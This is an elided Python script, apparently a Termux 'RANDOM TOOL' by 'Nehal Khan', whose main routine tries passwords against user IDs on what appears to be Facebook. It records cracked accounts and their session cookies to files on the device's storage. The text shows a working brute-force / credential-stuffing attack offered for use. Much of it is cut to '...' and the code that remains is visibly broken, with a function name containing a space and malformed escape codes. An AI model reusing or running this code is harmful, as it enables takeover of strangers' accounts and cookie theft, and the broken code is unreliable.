#Sc Make By MAHMUD Nehal Khan
#Sc Gift By Nehal Khan
...
try:
    ...
    import os
print("\033[1;92m [•] Install. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [•] WALLCOME TO ROBIN TOOL \033[1;30m")
os.system('espeak -a 300 "Wallcome to robin tool"')
print("\033[1;92m   [•] THANKS FOR USEING MY TOOL \033[1;30m")
os.system('espeak -a 300 "THANKS FOT USEING MY TOOL"')
print("\033[1;92m   [•] THIS  RANDOM TOOL\033[1;30m")
os.system('espeak -a 300 "THIS  RANDOM TOOL"')
...
def __init__(self):
        ...
        self.cp = []
        self.loop = 0
os.system('xdg-open https://www.youtube.com/@ethicalrobinokh')        
logo = ("""
  _   _      _           _ 
 | \ | |    | |         | |
 |  \| | ___| |__   __ _| |
...
################################################
  ...
  [✓] AUTHOR    \033[1;91m: \033[1;91Nehal khan             
                                                                                                                   
  [✓] TOOL NAME    \033[1;92m: \033[1;92RANDOM TOOL         
                                                                                                                   
  [✓] YOUTUBE    \033[1;94m: \033[1;94Mind Tom 09  
...
def fuck():
    ...
    print(' [✓] OK Ids saved as Nehal Khan-OK.txt')
    print(' [✓] CP Id Save as Nehal Khan-CP.txt')
    print('-------------------')
def Nehal Khan(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[Nehal Khan]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[Nehal Khan-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/Nehal Khan-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[Nehal Khan-CP] {cid}|{ps}")
